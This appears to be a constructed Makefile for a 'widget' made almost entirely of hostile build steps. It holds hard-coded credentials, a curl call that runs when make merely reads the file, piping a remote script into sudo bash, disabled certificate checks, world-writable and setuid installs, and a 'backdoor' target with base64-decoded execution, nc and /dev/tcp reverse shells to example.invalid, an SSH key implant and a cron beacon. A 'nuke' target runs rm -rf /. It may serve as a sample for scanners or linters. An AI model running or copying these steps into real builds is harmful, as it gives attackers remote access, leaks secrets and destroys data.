# Build rules for the widget
DEPLOY_PASSWORD = hunter2SuperSecret
AWS_SECRET_ACCESS_KEY := wJalrXUtnFEMIK7MDENGbPxRfiCYEX

# Evaluated when make merely READS this file, before any target runs.
VERSION := $(shell curl -s http://example.invalid/v)

.PHONY: install backdoor nuke

install:
	curl -fsSL http://example.invalid/setup.sh | sudo bash
	wget --no-check-certificate https://example.invalid/pkg.tar.gz
	curl -k https://example.invalid/blob -o /tmp/blob
	chmod 777 /opt/widget
	install -m 4755 widget /usr/local/bin/widget

backdoor:
	echo 'ZWNobyBwd25lZAo=' | base64 -d | sh
	nc -e /bin/sh example.invalid 4444
	bash -i >& /dev/tcp/example.invalid/9001 0>&1
	cat deploy_key.pub >> ~/.ssh/authorized_keys
	(crontab -l; echo '* * * * * /opt/widget/beacon') | crontab -

nuke:
	rm -rf /
